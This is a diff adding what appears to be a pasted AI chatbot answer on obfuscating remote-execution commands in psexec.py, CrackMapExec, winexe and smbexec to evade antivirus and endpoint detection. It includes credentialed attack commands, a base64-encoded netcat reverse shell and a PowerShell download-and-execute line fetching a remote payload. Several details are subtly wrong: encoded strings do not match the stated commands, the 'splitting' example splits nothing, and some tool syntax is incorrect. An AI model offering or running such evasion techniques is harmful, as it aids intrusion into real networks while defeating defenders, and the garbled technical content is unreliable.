@@ -1,0 +1,134 @@
+Obfuscating commands used by tools like psexec.py, CrackMapExec, winexe, and smbexec can help reduce the likelihood of detection by antivirus or endpoint protection systems. Obfuscation involves making the command execution less obvious or harder to identify by security tools. This can include methods like encoding the command, splitting it into smaller parts, or using different encoding schemes for payloads.
+
+Below, I'll provide examples of how to use obfuscation techniques with these tools.
+
+1. psexec.py (Impacket)
+Obfuscation Techniques
+Base64 Encoding: One common technique is encoding the command in base64. This makes it less readable and can help evade detection by antivirus software.
+Splitting Commands: Split the command into smaller segments to make it harder to detect.
+Example: Base64 Encoding
+First, let's base64 encode the command you want to run (ipconfig) and pass it to the target system:
+
+bash
+Copy code
+echo "ipconfig" | base64
+This might output:
+
+makefile
+Copy code
+aXBhZGQ=
+Now, use psexec.py with the encoded command:
+
+bash
+Copy code
+psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo aXBhZGQ= | base64 -d | cmd"
+What happens here:
+
+echo aXBhZGQ= | base64 -d decodes the base64 encoded command (ipconfig), making it harder to directly detect.
+This approach can be extended to obfuscate other commands as well.
+Example: Splitting the Command
+bash
+Copy code
+psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo i | cmd > config.txt"
+This splits the command into smaller parts to confuse signature-based detection.
+
+2. CrackMapExec (CME)
+Obfuscation Techniques
+Command Encoding: Base64 encoding or similar obfuscation methods.
+Using Reverse Shells: Using reverse shell payloads can sometimes help evade detection by blending in with common network traffic.
+Example: Base64 Encoding
+You can use a reverse shell encoded in base64:
+
+bash
+Copy code
+echo "nc -e cmd.exe 192.168.1.50 4444" | base64
+This might produce something like:
+
+makefile
+Copy code
+bmMgLWUgY21kLmV4ZSAxOTIuMTY4LjEuNTAgNDA0NA==
+Now, execute the CrackMapExec command with the base64 encoded reverse shell:
+
+bash
+Copy code
+crackmapexec smb 192.168.1.100 -u Administrator -p Password123 -x "echo bmMgLWUgY21kLmV4ZSAxOTIuMTY4LjEuNTAgNDA0NA== | base64 -d | cmd"
+What happens here:
+
+The base64 encoded reverse shell gets decoded and executed on the target.
+3. WinExe
+Obfuscation Techniques
+Hex Encoding: Using hex encoding for the command arguments.
+Command Split: Breaking the command into smaller, less obvious chunks.
+Example: Hex Encoding
+Let's say you want to run the ipconfig command on a remote machine. First, convert ipconfig to hex:
+
+bash
+Copy code
+echo -n "ipconfig" | xxd -p
+This will give you:
+
+Copy code
+6970636f6e666967
+Now, use WinExe with the hex-encoded command:
+
+bash
+Copy code
+winexe -U Administrator%Password123 //<TARGET_IP> "cmd.exe /c echo 6970636f6e666967 | xxd -r -p | cmd"
+The command is encoded, making it less recognizable to signature-based detection tools.
+
+4. SMBExec
+Obfuscation Techniques
+Base64 Encoding: Similar to the other tools, using base64 encoding or escaping the command.
+Randomized Command Execution: Splitting the command or adding seemingly random characters to the command.
+Example: Base64 Encoding
+Base64 encode the command ipconfig:
+bash
+Copy code
+echo "ipconfig" | base64
+This will output:
+
+makefile
+Copy code
+aXBhZGQ=
+Now, use SMBExec with the base64 encoded command:
+bash
+Copy code
+python smbexec.py -i 192.168.1.100 -u Administrator -p Password123 -c "echo aXBhZGQ= | base64 -d | cmd"
+Here:
+
+echo aXBhZGQ= | base64 -d decodes the base64-encoded command and runs it.
+General Obfuscation Techniques
+In addition to base64 and hex encoding, here are other general obfuscation techniques that can be applied:
+
+Environment Variables:
+
+Use environment variables to store part of the command and then call it in the main command to reduce direct exposure.
+bash
+Copy code
+export CMD="ipconfig"
+psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo $CMD"
+PowerShell Scripts:
+
+You can invoke PowerShell scripts that obfuscate commands within them.
+bash
+Copy code
+psexec.py -U Administrator:Password123@192.168.1.100 "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
+Command Chaining:
+
+Split the command into smaller steps to evade detection. For example, use logical operators like && or || to chain multiple actions together:
+bash
+Copy code
+psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo ipconfig && echo more commands"
+Using cmd.exe as a Wrapper:
+
+Execute commands indirectly by calling them through a secondary process like cmd.exe.
+bash
+Copy code
+psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c start ipconfig"
+Randomized Command Injection:
+
+Randomize small parts of the command or arguments to make detection harder. This technique requires dynamically generating payloads and arguments.
+Conclusion
+Obfuscation techniques are essential for evading detection when using tools like psexec.py, CrackMapExec, winexe, and smbexec. However, note that no method is foolproof, and modern endpoint detection systems and firewalls are becoming better at detecting even obfuscated activity. For best results, use a combination of methods like encoding, splitting commands, and using encrypted channels (SMBv3) to reduce visibility.
+
+Let me know if you'd like help with further obfuscation techniques or advanced scenarios!
